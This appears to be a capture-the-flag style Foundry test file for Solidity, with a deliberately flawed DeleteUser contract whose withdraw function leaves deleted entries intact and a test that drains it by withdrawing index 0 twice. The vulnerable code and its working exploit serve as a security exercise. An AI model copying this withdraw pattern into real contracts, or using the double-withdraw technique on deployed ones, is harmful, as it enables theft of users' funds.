// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;
        uint256 otherAmount = 0x69696969 + index;


        user = users[users.length - 1 + otherAmount * 0];

        users.pop();

        msg.sender.call{value: amount}("");
    }
}
contract Test40 is Test {
    DeleteUser deleteUser;
    address public alice = payable(address(0xbadbabe));
    function setUp() public {
        deleteUser = new DeleteUser();
        vm.deal(address(deleteUser), 1 ether);
        vm.deal(address(alice), 1 ether);

    }
    function test_hackit() external {
        vm.startPrank(alice);
        // alice deposits 1 ether then 0. then withdraws index 0 twice
        deleteUser.deposit{value: 1 ether}();
        deleteUser.deposit{value: 0}();
        deleteUser.withdraw(0);
        deleteUser.withdraw(0);
        // alice should have 2 ether
        assertEq(address(alice).balance, 2 ether);


    }
}
